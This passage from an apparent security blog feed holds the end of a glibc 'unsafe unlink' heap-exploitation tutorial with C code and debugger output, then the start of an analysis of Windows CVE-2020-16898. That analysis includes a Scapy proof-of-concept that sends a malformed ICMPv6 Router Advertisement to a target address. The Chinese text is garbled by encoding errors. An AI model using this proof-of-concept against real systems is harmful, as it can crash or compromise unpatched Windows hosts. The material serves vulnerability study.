class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">â–º <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª chunk ï¼ˆ æˆ‘ä»¬è®¾ç½®æˆ‘ä»¬çš„å‡å—å¤§å°ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44fä¸­ä»‹ç»çš„æ£€æŸ¥ã€‚</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">â–º <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¾ç½®å¥½ size ï¼Œ fd ï¼Œbk ä»¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‡è®¾æˆ‘ä»¬åœ¨chunk0ä¸­æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è‡ªç”±åœ°æ”¹å˜chunk1çš„æ•°æ®</p><p>ä¾‹å¦‚æ”¹ chunk1 çš„preve size  å’Œ size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> â–º <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±ä¼šåˆ¤æ–­ chunk0 ä¸º free çŠ¶æ€ï¼Œç„¶åæˆ‘ä»¬free chunk1_ptr å°±ä¼šå‘ç”Ÿ unlink, unlink fake chunkçš„é“¾æ¥ï¼Œè¦†ç›–chunk0_ptr</p><p>æœ€å æˆ‘ä»¬å¯ä»¥ä½¿ç”¨chunk0_ptrè¦†ç›–è‡ªèº«ï¼Œå¦å…¶æŒ‡å‘ä¸€ä¸ªä»»æ„ä½ç½®,è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™çš„ç›®çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> â–º <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> â–º <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> â–º <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16898 &quot;Bad Neighbor&quot; åˆ†æ</title>
      <link href="CVE-2020-15898-analysis.html"/>
      <url>CVE-2020-15898-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>2020å¹´10æœˆ14æ—¥ï¼Œå¾®è½¯ä¿®å¤äº†ä¸€ä¸ªç´§æ€¥æ¼æ´ï¼šWindows TCP/IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·ä¸º CVE-2020-16898ã€‚</p><p>ä»14 å·å…¬å¼€çš„ä¿¡æ¯å¯ä»¥å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸ ipv6 åè®®æœ‰å…³ï¼Œæ¼æ´ç±»å‹ä¸ºæ ˆæº¢å‡ºçš„æ¼æ´ã€‚</p><h2 id="æ¼æ´å¯»æ‰¾"><a href="#æ¼æ´å¯»æ‰¾" class="headerlink" title="æ¼æ´å¯»æ‰¾"></a>æ¼æ´å¯»æ‰¾</h2><p>é€šè¿‡å…¬å¼€ä¿¡æ¯</p><blockquote><p>A remote code execution vulnerability exists whenâ€¯theâ€¯Windows TCP/IP stackâ€¯improperly handlesâ€¯ICMPv6 Router Advertisementâ€¯packets that use Option Type 25 (Recursive DNS Serverâ€¯Option)â€¯and a length field value that is even.â€¯In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each.â€¯As a result, the length field should always be an odd value of at least 3, per <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>ä»¥åŠè¡¥ä¸çš„ diff æˆ‘ä»¬å¤§è‡´å®šä½äº†æ¼æ´çš„ä½ç½®</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>æ¼æ´å‘ç”Ÿçš„åŸå› åº”è¯¥åœ¨ <code>Ipv6pUpdateRDNSS</code> å‡½æ•°ä¸­</p><h2 id="Router-Advertisement-RA-for-short-åè®®"><a href="#Router-Advertisement-RA-for-short-åè®®" class="headerlink" title="Router Advertisement (RA for short) åè®®"></a><code>Router Advertisement</code> (RA for short) åè®®</h2><p>é€šè¿‡ <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> æˆ‘ä»¬å¯ä»¥çŸ¥é“åè®®æŠ¥æ–‡å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç€é‡çŸ¥é“ä»¥ä¸‹å‡ ä¸ª</p><ul><li><strong>Typeï¼ˆ1ä¸ªå­—èŠ‚ï¼‰</strong>ï¼šRDNSSé€‰é¡¹ç±»å‹çš„ç±»å‹ä¸º 25ï¼ˆ0x19ï¼‰</li><li><strong>Lengthï¼ˆ1ä¸ªå­—èŠ‚ï¼‰</strong>ï¼šå¦‚æœè¯¥é€‰é¡¹ä¸­åŒ…å«ä¸€ä¸ª IPv6 åœ°å€ï¼Œåˆ™é•¿åº¦å–æœ€å°å€¼3 ã€‚æ¯å¢åŠ ä¸€ä¸ª RDNSS åœ°å€ï¼Œé•¿åº¦å°±ä¼šå¢åŠ 2ã€‚æ¥æ”¶å™¨ä½¿ç”¨â€œé•¿åº¦â€å­—æ®µæ¥ç¡®å®šé€‰é¡¹ä¸­IPv6åœ°å€çš„æ•°é‡</li><li><strong>Addresses of IPv6 Recursive DNS Serversï¼ˆå¯å˜é•¿åº¦ï¼Œç”±â€œLengthâ€å­—æ®µç¡®å®šï¼‰</strong>ï¼šä¸€ä¸ªæˆ–å¤šä¸ªé€’å½’DNSæœåŠ¡å™¨çš„ 128 ä½ IPv6 åœ°å€ ã€‚åœ°å€ä¸ªæ•°ä¸ºï¼ˆLength - 1ï¼‰/ 2</li></ul><p>åè®®ä¸­è§„å®šï¼š</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>å³ Length é•¿åº¦å­—æ®µè¦æ»¡è¶³ <code>(Length - 1) % 2 == 0</code> åˆ™ length å­—æ®µå¿…ä¸ºå¥‡æ•°ï¼Œä¸”æ˜¯å¤§äºç­‰äº3 çš„å¥‡æ•°</p><p>å‡è®¾æ­¤æ—¶ length é•¿åº¦ä¸º 3ï¼Œ åˆ™åœ°å€ä¸ªæ•°ä¸º ï¼ˆ3 - 1) / 2  == 1 ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªåœ°å€é•¿åº¦ä¸º 16 å­—èŠ‚ã€‚IPv6 Recursive DNS Servers åœ°å€å‰çš„å­—æ®µå  8 å­—èŠ‚ï¼Œæ¯ä¸ª IPv6 Recursive DNS Servers åœ°å€é•¿åº¦ä¸º 16 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ­£å¸¸çš„ RDNSS é€‰é¡¹æ€»é•¿åº¦åº”æ»¡è¶³ 16x+8ï¼ˆx&gt;=1ï¼‰ï¼Œå°†å…¶é™¤ä»¥ 8 å°±æ˜¯ 2x+1ï¼ˆx&gt;=1ï¼‰ ï¼Œä¹Ÿå°±æ˜¯ Length å­—æ®µåº”è¯¥æ»¡è¶³çš„æ¡ä»¶ã€‚ç”±äº IPv6 RDNSS åœ°å€ä¸º 16 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ RDNSS é€‰é¡¹æ€»é•¿åº¦ä¼šä»¥ 16 å­—èŠ‚é€’å¢ï¼Œä¸€ä¸ªæœ€å°çš„é•¿åº¦ä¸º 24ï¼ˆ8+16ï¼‰</p><h2 id="å¦‚æœ-Length-æ˜¯å¶æ•°"><a href="#å¦‚æœ-Length-æ˜¯å¶æ•°" class="headerlink" title="å¦‚æœ Length æ˜¯å¶æ•°"></a>å¦‚æœ Length æ˜¯å¶æ•°</h2><p>é€šè¿‡å­¦ä¹ åè®®ï¼Œæˆ‘ä»¬çŸ¥é“é€šå¸¸ä¸‹ï¼Œ length çš„å€¼åº”ä¸ºå¤§äºç­‰ 3 çš„å¥‡æ•°ï¼Œä½†æ˜¯å¦‚æœå½“ä¼ å…¥çš„ length ä¸ºå¶æ•° 2 ï¼Œé‚£ä¹ˆä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ</p><p>æŒ‰ç…§åè®®ç†è§£ï¼Œæ­¤æ—¶ ï¼ˆ2-1ï¼‰/2 == 0 ï¼Œåˆ™ä¼šåˆ¤æ–­æ­¤ packet æ²¡æœ‰åœ°å€ï¼Œåˆ™ç†åº”ä¼šæŠŠ RDNSS é€‰é¡¹çš„æœ€å 8 ä¸ªå­—èŠ‚é”™è¯¯çš„è®¤ä¸ºç¬¬ä¸‹ä¸€ä¸ªä¸ªé€‰é¡¹çš„å‰8ä¸ªå­—èŠ‚ã€‚</p><p>ä¾‹å¦‚å‡è®¾æˆ‘ä»¬è®¾ç½® length é•¿åº¦ä¸º 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>æˆ‘ä»¬é€‰å–ä¸Šé¢çš„ä¸€æ®µæ±‡ç¼–åšä¸€ä¸ªç®€å•çš„æ³¨é‡Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>å³è¿™æ–­ä»£ç åœ¨åšè®¡ç®— åœ°å€æ•° <code>(4 - 1) / 2 == 1</code>. å› è€Œä¼šå°† NET_BUFFER å‰è¿› 24 ä¸ªå­—èŠ‚ï¼ˆ3*8ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®©ç¨‹åºèµ°åˆ°ä¸‹ä¸€ä¸ªå–ä¸‹ä¸€ä¸ªé€‰é¡¹çš„æ—¶å€™ï¼Œå‘ç°ï¼Œæ­¤æ—¶çš„é€‰é¡¹çš„å‰8ä¸ªå­—èŠ‚å¯è¢«ä¼ªé€ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ"><a 